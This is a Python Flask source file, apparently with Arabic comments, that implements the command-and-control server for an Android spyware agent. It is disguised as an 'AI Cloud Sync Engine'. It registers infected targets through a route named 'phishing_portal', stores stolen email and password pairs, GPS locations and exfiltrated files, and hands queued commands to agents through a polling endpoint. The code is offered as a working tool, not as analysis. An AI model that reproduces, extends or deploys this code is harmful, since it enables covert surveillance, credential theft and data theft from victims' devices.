from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
import base64
import urllib3
import datetime
import json
import hashlib

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v78_real_engine").digest()

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

# 🛡️ الذاكرة المركزية الميدانية للهدف (v78.5)
AGENT_SESSIONS = {}
COMMAND_QUEUE = {}
CAPTURED_CREDENTIALS = []
CAPTURED_SESSIONS = []
CAPTURED_LOCATIONS = []
CAPTURED_KEYSTROKES = []
EXTRACTED_FILES = []
EXTRACTED_ALL_FILES = []
SYSTEM_RECON_DATA = []
TELEMETRY_LOGS = []

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "AI Cloud Sync Engine v78.5 Active", "target_mode": "synchronized"})

# ----------------- مسارات الاستقبال والتنسيق مع تطبيق الهدف (Android Agent) -----------------

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'agent_target')
    agent_info = {
        "agent": f"{req_data.get('user_agent', 'Android Target')[:25]}",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Android Native'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    AGENT_SESSIONS[token] = agent_info
    COMMAND_QUEUE[token] = ""
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/telemetry', methods=['POST'])
def api_telemetry():
    req_data = request.get_json(silent=True) or {}
    entry = {
        "token": req_data.get('token', 'N/A'),
        "connection": req_data.get('connection', 'Active'),
        "platform": req_data.get('platform', 'Android App'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    TELEMETRY_LOGS.append(entry)
    return jsonify({"status": "telemetry_secured"})

@app.route('/api/location', methods=['POST'])
def api_location():
    req_data = request.get_json(silent=True) or {}
    entry = {
        "token": req_data.get('token', 'N/A'),
        "lat": req_data.get('lat', 'N/A'),
        "lon": req_data.get('lon', 'N/A'),
        "accuracy": req_data.get('accuracy', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    CAPTURED_LOCATIONS.append(entry)
    return jsonify({"status": "location_secured"})

@app.route('/api/upload', methods=['POST'])
def api_upload():
    req_data = request.get_json(silent=True) or {}
    entry = {
        "token": req_data.get('token', 'N/A'),
        "filename": req_data.get('filename', 'snapshot.png'),
        "data": req_data.get('data', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    EXTRACTED_FILES.append(entry)
    return jsonify({"status": "file_secured"})

# 📂 مسار وحدة الاستخراج الشامل للملفات (v78.5 Comprehensive File Extraction)
@app.route('/api/extract_files', methods=['POST'])
def api_extract_files():
    req_data = request.get_json(silent=True) or {}
    entry = {
        "token": req_data.get('token', 'N/A'),
        "filename": req_data.get('filename', 'target_file.bin'),
        "data": req_data.get('data', ''),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    EXTRACTED_ALL_FILES.append(entry)
    print(f"[+] تم سحب واستخراج ملف من الهدف بنجاح: {entry['filename']} [Token: {entry['token']}]")
    return jsonify({"status": "success", "message": "File extracted and secured successfully"})

@app.route('/api/credentials', methods=['POST'])
def capture_credentials():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_CREDENTIALS.append({
        "token": req_data.get('token', 'N/A'),
        "email": req_data.get('email', 'N/A'),
        "password": req_data.get('password', 'N/A'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "secured"})

@app.route('/api/poll', methods=['GET'])
def poll_commands():
    token = request.args.get('token', '')
    cmd = COMMAND_QUEUE.get(token, "")
    if token in COMMAND_QUEUE:
        COMMAND_QUEUE[token] = ""
    return jsonify({"command": cmd})

@app.route('/api/status', methods=['GET'])
def api_status():
    return jsonify({
        "status": "نشط وتحت السيطرة المطلقة 🟢",
        "agents_count": len(AGENT_SESSIONS),
        "extracted_files_count": len(EXTRACTED_ALL_FILES),
        "locations_count": len(CAPTURED_LOCATIONS),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
